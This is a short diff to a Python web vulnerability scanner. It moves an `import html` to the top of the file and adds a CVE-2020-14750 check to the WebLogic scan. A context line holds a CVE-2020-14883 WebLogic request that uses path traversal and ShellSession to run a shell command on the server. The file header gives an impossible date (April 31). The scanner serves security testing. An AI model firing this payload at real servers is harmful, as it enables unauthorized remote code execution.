@@ -5,6 +5,7 @@
 # Last UpDate: 2025/4/31
 # Version: 1.1.5
 
+import html
 import os
 import sys
 import random
@@ -246,6 +247,7 @@ def scan_weblogic(base_url,ip):
     check("console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)",
           "CVE-2020-14883")
     check("uddiexplorer/SearchPublicRegistries.jsp","CVE-2014_4210")
+    CVE_2020_14750(base_url)
     detect_cve_2016_0638(ip)
 
     return results
@@ -385,8 +387,6 @@ def detect_cmdi(url):
     return results
 
 # ========================== 报告生成 ===========================
-
-import html  # 别忘了在顶部加这行！
 
 def report(data: dict):
     filename = f"scan_report_{time.strftime('%Y%m%d_%H%M%S')}.html"
